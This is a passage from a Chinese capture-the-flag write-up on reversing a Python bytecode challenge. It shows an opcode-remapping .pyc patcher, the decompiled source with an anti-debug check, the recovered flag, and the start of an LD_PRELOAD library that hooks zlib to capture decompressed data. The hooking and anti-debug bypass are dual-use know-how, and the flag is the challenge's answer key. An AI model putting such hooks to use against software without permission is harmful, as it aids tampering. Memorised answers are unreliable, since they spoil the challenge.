<span class="number">0x74</span>: <span class="string">&quot;JUMP_FORWARD&quot;</span>,</span><br><span class="line">    <span class="number">0x77</span>: <span class="string">&quot;LOAD_CONST&quot;</span>, <span class="number">0x78</span>: <span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="number">0x79</span>: <span class="string">&quot;STORE_FAST&quot;</span>, <span class="number">0x7A</span>: <span class="string">&quot;BUILD_SET&quot;</span>,</span><br><span class="line">    <span class="number">0x7C</span>: <span class="string">&quot;LOAD_ATTR&quot;</span>, <span class="number">0x7D</span>: <span class="string">&quot;BUILD_MAP&quot;</span>, <span class="number">0x7E</span>: <span class="string">&quot;DELETE_FAST&quot;</span>, <span class="number">0x82</span>: <span class="string">&quot;SETUP_WITH&quot;</span>,</span><br><span class="line">    <span class="number">0x83</span>: <span class="string">&quot;CALL_FUNCTION&quot;</span>, <span class="number">0x84</span>: <span class="string">&quot;BUILD_SET_UNPACK&quot;</span>, <span class="number">0x85</span>: <span class="string">&quot;MAP_ADD&quot;</span>, <span class="number">0x86</span>: <span class="string">&quot;UNPACK_EX&quot;</span>,</span><br><span class="line">    <span class="number">0x87</span>: <span class="string">&quot;EXTENDED_ARG&quot;</span>, <span class="number">0x88</span>: <span class="string">&quot;STORE_DEREF&quot;</span>, <span class="number">0x89</span>: <span class="string">&quot;CONTINUE_LOOP&quot;</span>, <span class="number">0x8A</span>: <span class="string">&quot;SETUP_ASYNC_WITH&quot;</span>,</span><br><span class="line">    <span class="number">0x8C</span>: <span class="string">&quot;CALL_FUNCTION_VAR&quot;</span>, <span class="number">0x8D</span>: <span class="string">&quot;CALL_FUNCTION_KW&quot;</span>, <span class="number">0x8E</span>: <span class="string">&quot;CALL_FUNCTION_VAR_KW&quot;</span>,</span><br><span class="line">    <span class="number">0x8F</span>: <span class="string">&quot;RAISE_VARARGS&quot;</span>, <span class="number">0x90</span>: <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="number">0x91</span>: <span class="string">&quot;MAKE_CLOSURE&quot;</span>, <span class="number">0x92</span>: <span class="string">&quot;DELETE_GLOBAL&quot;</span>,</span><br><span class="line">    <span class="number">0x93</span>: <span class="string">&quot;BUILD_MAP_UNPACK&quot;</span>, <span class="number">0x94</span>: <span class="string">&quot;DELETE_NAME&quot;</span>, <span class="number">0x95</span>: <span class="string">&quot;DELETE_DEREF&quot;</span>, <span class="number">0x96</span>: <span class="string">&quot;STORE_ATTR&quot;</span>,</span><br><span class="line">    <span class="number">0x97</span>: <span class="string">&quot;JUMP_ABSOLUTE&quot;</span>, <span class="number">0x98</span>: <span class="string">&quot;STORE_GLOBAL&quot;</span>, <span class="number">0x99</span>: <span class="string">&quot;BUILD_MAP_UNPACK_WITH_CALL&quot;</span>,</span><br><span class="line">    <span class="number">0x9A</span>: <span class="string">&quot;LOAD_NAME&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># -----------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># assume modified interpreter used HAVE_ARGUMENT = 81 and OPARG_WIDTH = 2</span></span><br><span class="line">HAVE_ARGUMENT_MOD = <span class="number">81</span></span><br><span class="line">OPARG_WIDTH = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># build reverse_map: modified_byte -&gt; std opcode number (dis.opmap)</span></span><br><span class="line">std_opmap = dis.opmap</span><br><span class="line">reverse_map = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> mb, opname <span class="keyword">in</span> MODIFIED.items():</span><br><span class="line">    <span class="keyword">if</span> opname <span class="keyword">in</span> std_opmap:</span><br><span class="line">        reverse_map[mb] = std_opmap[opname]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Warning: opname %r not found in std opmap; skipping&quot;</span> % opname)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">has_arg_by_mapping</span>(<span class="params">mod_byte</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Given original modified opcode byte, return True if mapping target standard opcode uses argument.</span></span><br><span class="line"><span class="string">    We conservatively treat unmapped bytes as no-arg (safe).</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    std = reverse_map.get(mod_byte)</span><br><span class="line">    <span class="keyword">if</span> std <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> std &gt;= dis.HAVE_ARGUMENT</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">step_len</span>(<span class="params">mod_byte</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> + (OPARG_WIDTH <span class="keyword">if</span> has_arg_by_mapping(mod_byte) <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch_codeobj_recursive</span>(<span class="params">co</span>):</span><br><span class="line">    b = <span class="built_in">bytearray</span>(co.co_code)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    n = <span class="built_in">len</span>(b)</span><br><span class="line">    replaced = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        mod_op = b[i]</span><br><span class="line">        <span class="keyword">if</span> mod_op <span class="keyword">in</span> reverse_map:</span><br><span class="line">            new = reverse_map[mod_op]</span><br><span class="line">            <span class="keyword">if</span> new != mod_op:</span><br><span class="line">                <span class="comment"># replace opcode byte</span></span><br><span class="line">                b[i] = new</span><br><span class="line">                replaced += <span class="number">1</span></span><br><span class="line">        <span class="comment"># step using mapping on the *original* mod_op, not new opcode</span></span><br><span class="line">        i += step_len(mod_op)</span><br><span class="line">    <span class="comment"># patch nested constants</span></span><br><span class="line">    new_consts = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> co.co_consts:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(c, types.CodeType):</span><br><span class="line">            new_consts.append(patch_codeobj_recursive(c))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new_consts.append(c)</span><br><span class="line">    <span class="comment"># reconstruct code object</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(co, <span class="string">&quot;replace&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> co.replace(co_code=<span class="built_in">bytes</span>(b), co_consts=<span class="built_in">tuple</span>(new_consts))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># Python 3.5 signature</span></span><br><span class="line">        <span class="keyword">return</span> types.CodeType(</span><br><span class="line">            co.co_argcount,</span><br><span class="line">            co.co_kwonlyargcount,</span><br><span class="line">            co.co_nlocals,</span><br><span class="line">            co.co_stacksize,</span><br><span class="line">            co.co_flags,</span><br><span class="line">            <span class="built_in">bytes</span>(b),</span><br><span class="line">            <span class="built_in">tuple</span>(new_consts),</span><br><span class="line">            co.co_names,</span><br><span class="line">            co.co_varnames,</span><br><span class="line">            co.co_filename,</span><br><span class="line">            co.co_name,</span><br><span class="line">            co.co_firstlineno,</span><br><span class="line">            co.co_lnotab,</span><br><span class="line">            co.co_freevars,</span><br><span class="line">            co.co_cellvars</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch_and_write</span>(<span class="params">infile, outfile</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(infile, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        header = f.read(<span class="number">12</span>)   <span class="comment"># py3.5 header</span></span><br><span class="line">        top = marshal.load(f)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Loaded top-level code object:&quot;</span>, top.co_name)</span><br><span class="line">    patched = patch_codeobj_recursive(top)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(outfile, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(header)</span><br><span class="line">        marshal.dump(patched, f)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Wrote patched pyc:&quot;</span>, outfile)</span><br><span class="line">    <span class="keyword">return</span> outfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_pyc_with_subprocess</span>(<span class="params">pyc_path</span>):</span><br><span class="line">    <span class="comment"># Use same python executable to run the patched pyc in a fresh interpreter process.</span></span><br><span class="line">    py = sys.executable</span><br><span class="line">    <span class="comment"># On some setups, running a .pyc directly works; better to call: python patched_pyc</span></span><br><span class="line">    <span class="comment"># We&#x27;ll run a small wrapper that imports runpy to run the pyc safely.</span></span><br><span class="line">    wrapper = (</span><br><span class="line">        <span class="string">&quot;import runpy, sys\n&quot;</span></span><br><span class="line">        <span class="string">&quot;runpy.run_path(sys.argv[1], run_name=&#x27;__main__&#x27;)\n&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># create a temporary wrapper script</span></span><br><span class="line">    tmpdir = tempfile.mkdtemp(prefix=<span class="string">&quot;runpatch_&quot;</span>)</span><br><span class="line">    wrapper_py = os.path.join(tmpdir, <span class="string">&quot;runner.py&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(wrapper_py, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(wrapper)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Spawning subprocess: %s %s %s&quot;</span> % (py, wrapper_py, pyc_path))</span><br><span class="line">        proc = subprocess.Popen([py, wrapper_py, pyc_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">        out, err = proc.communicate(timeout=<span class="number">30</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== STDOUT ===&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(out.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;backslashreplace&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== STDERR ===&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(err.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;backslashreplace&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Exit code:&quot;</span>, proc.returncode)</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        proc.kill()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Subprocess timed out and was killed.&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        shutil.rmtree(tmpdir)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python patch_and_run_subprocess.py ooops.pyc [out_patch.pyc]&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    inf = sys.argv[<span class="number">1</span>]</span><br><span class="line">    outf = sys.argv[<span class="number">2</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">3</span> <span class="keyword">else</span> inf.replace(<span class="string">&quot;.pyc&quot;</span>, <span class="string">&quot;-patch.pyc&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(inf):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Input not found:&quot;</span>, inf); sys.exit(<span class="number">2</span>)</span><br><span class="line">    patch_and_write(inf, outf)</span><br><span class="line">    run_pyc_with_subprocess(outf)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后运行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib.util, zlib, struct</span><br><span class="line"></span><br><span class="line">spec = importlib.util.spec_from_file_location(<span class="string">&quot;ooops&quot;</span>, <span class="string">&quot;ooops-patch.pyc&quot;</span>)</span><br><span class="line">ooops = importlib.util.module_from_spec(spec)</span><br><span class="line">spec.loader.exec_module(ooops)</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;\xc6;3\xce\xa0\xbd\xcfHyKO\x9b*\x19\xb2\xbf&#x27;</span></span><br><span class="line">enc_data = <span class="string">b&#x27;2\x00\x00\x00S\xff\x07/\x19\xcbf?@\xd4\xbe\xa7x\x05\xf7\xf13\xe93\xc9\x04\xb6\x00W7\xb0\x0f\xf3`,Fp\xe6a\x1f\xc7\xb8\xd3\x06\x1b;\x1f\xafs\xc8\x07\xe9p\x84\x08&#x27;</span></span><br><span class="line"></span><br><span class="line">decrypted = ooops.decrypt_flag(enc_data, key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag =&gt;&quot;</span>, decrypted)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag &#x3D;&gt; b’flag{Reverse_This_Ultra_Hard_Challenge!!!}’</p><p>直接把flag打出来了</p><p>后来发现</p><p>uncompyle6 ooops-patch.pyc，它这个程序生成一个patch文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">(py35) E:\Desktop\huaweiCTF\ooops&gt;uncompyle6 ooops-patch.pyc</span><br><span class="line"><span class="comment"># uncompyle6 version 3.9.2</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.5.2 (3351)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.10.14 | packaged by conda-forge | (main, Mar 20 2024, 12:40:08) [MSC v.1938 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: ooops.py</span></span><br><span class="line"><span class="keyword">import</span> sys, struct, zlib, ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">anti_debug</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> ctypes.windll.kernel32.IsDebuggerPresent():</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">data, key</span>):</span><br><span class="line">    size = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, data[:<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">    data = data[<span class="number">4</span>:<span class="number">4</span> + size]</span><br><span class="line">    data = <span class="built_in">bytearray</span>(data)</span><br><span class="line">    indices = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        j = (i * <span class="number">57005</span> + <span class="number">48879</span>) % <span class="built_in">len</span>(data)</span><br><span class="line">        indices[i], indices[j] = indices[j], indices[i]</span><br><span class="line"></span><br><span class="line">    data = <span class="built_in">bytes</span>(data[i] <span class="keyword">for</span> i <span class="keyword">in</span> indices)</span><br><span class="line">    data = <span class="built_in">bytes</span>(b ^ key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(data))</span><br><span class="line">    <span class="keyword">return</span> zlib.decompress(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    anti_debug()</span><br><span class="line">    key = <span class="string">b&#x27;\xc6;3\xce\xa0\xbd\xcfHyKO\x9b*\x19\xb2\xbf&#x27;</span></span><br><span class="line">    enc_data = <span class="string">b&#x27;2\x00\x00\x00S\xff\x07/\x19\xcbf?@\xd4\xbe\xa7x\x05\xf7\xf13\xe93\xc9\x04\xb6\x00W7\xb0\x0f\xf3`,Fp\xe6a\x1f\xc7\xb8\xd3\x06\x1b;\x1f\xafs\xc8\x07\xe9p\x84\x08&#x27;</span></span><br><span class="line">    user_input = <span class="built_in">input</span>(<span class="string">&quot;Enter flag: &quot;</span>).encode()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decrypted = decrypt_flag(enc_data, key)</span><br><span class="line">        <span class="keyword">if</span> user_input == decrypted:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Correct!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Wrong!&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: Invalid input&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="解法二-LD-PRELOAD文件劫持"><a href="#解法二-LD-PRELOAD文件劫持" class="headerlink" title="解法二: LD_PRELOAD文件劫持"></a>解法二: LD_PRELOAD文件劫持</h3><p>在发现zlib时，其实可以想到，可以去hook或者调试，只要绕过反调就能看到解压的flag</p><p>先来试一下文件劫持(<strong>优点是无需绕过反调试</strong>)</p><p>因为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hookzlib.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;zlib.h&gt;</span>    <span class="comment">// z_streamp, inflate, inflateEnd, etc.</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Hook zlib streaming API (inflate/inflateEnd) and legacy uncompress.</span></span><br><span class="line"><span class="comment">  - Writes produced (decompressed) bytes into captured_decompressed.bin</span></span><br><span class="line"><span class="comment">  - Uses constructor to open file once, destructor to close</span></span><br><span class="line"><span class="comment">  - Thread-safe append using a mutex</span></span><br><span class="line"><span class="comment">  - Calls real functions first (so dest buffer is filled), then dumps produced bytes</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// output file descriptor and mutex</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> outfd = <span class="number">-1</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">pthread_mutex_t</span> out_mutex = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">hook_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *path = <span class="string">&quot;captured_decompressed.bin&quot;</span>;</span><br><span class="line">    outfd = open(path, O_CREAT | O_WRONLY | O_APPEND, <span class="number">0600</span>);</span><br><span class="line">    <span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// best effort print</span></span><br><span class="line">        perror(<span class="string">&quot;hookzlib: open output file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((destructor))</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">hook_fini</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (outfd &gt;= <span class="number">0</span>) close(outfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// utility: write bytes to file (thread-safe)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">dump_bytes</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (outfd &lt; <span class="number">0</span> || buf == <span class="literal">NULL</span> || len == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    pthread_mutex_lock(&amp;out_mutex);</span><br><span class="line">    <span class="type">ssize_t</span> w = write(outfd, buf, len);</span><br><span class="line">    (<span class="type">void</span>)w; <span class="comment">// ignore short writes for now</span></span><br><span class="line">    pthread_mutex_unlock(&amp;out_mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- hook for legacy uncompress ----</span></span><br><span class="line"><span class="comment">   int uncompress(Bytef *dest, uLongf *destLen, const Bytef *source, uLong sourceLen);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*<span class="type">uncompress_t</span>)</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">unsigned</span> <span class="type">long</span>*, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">uncompress_t</span> real_uncompress = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">uncompress</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *dest, <span class="type">unsigned</span> <span class="type">long</span> *destLen, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *source, <span class="type">unsigned</span> <span class="type">long</span> sourceLen)</span> &#123;</span><br><span class="line">    <span class="comment">// lazy resolve</span></span><br><span class="line">    <span class="keyword">if</span> (!real_uncompress) &#123;</span><br><span class="line">        real_uncompress = (<span class="type">uncompress_t</span>)dlsym(RTLD_NEXT, <span class="string">&quot;uncompress&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> rc = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (real_uncompress) &#123;</span><br><span class="line">        rc = real_uncompress(dest, destLen, source, sourceLen);</span><br><span class="line">        <span class="comment">// on success, dest contains decompressed bytes, dstlen tells length</span></span><br><span class="line">        <span class="keyword">if</span> (rc == Z_OK &amp;&amp; dest &amp;&amp; destLen &amp;&amp; *destLen &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            dump_bytes(dest, (<span class="type">size_t</span>)(*destLen));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- hook for inflate (streaming) ----</span></span><br><span class="line"><span class="comment">   int inflate(z_streamp strm, int flush);</span></span><br><span class="line"><span class="comment">   We capture bytes produced in this call:</span></span><br><span class="line"><span class="comment">     produced = before_avail_out - after_avail_out</span></span><br><span class="line"><span class="comment">   produced bytes start at before_next_out pointer.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*<span class="type">inflate_t</span>)</span><span class="params">(z_streamp, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">inflate_t</span> real_inflate = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">inflate</span><span class="params">(z_streamp strm, <span class="type">int</span> flush)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!real_inflate) &#123;</span><br><span class="line">        real_inflate = (<span class="type">inflate_t</span>)dlsym(RTLD_NEXT, <span class="string">&quot;inflate&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!real_inflate) &#123;</span><br><span class="line">        <span class="comment">// not found, try to call nothing</span></span><br><span class="line">        <span class="keyword">return</span> Z_STREAM_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Record before state</span></span><br><span class="line">    uInt before_avail = <span class="number">0</span>;</span><br><span class="line">    Bytef *before_next_out = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (strm) &#123;</span><br><span class="line">        before_avail = 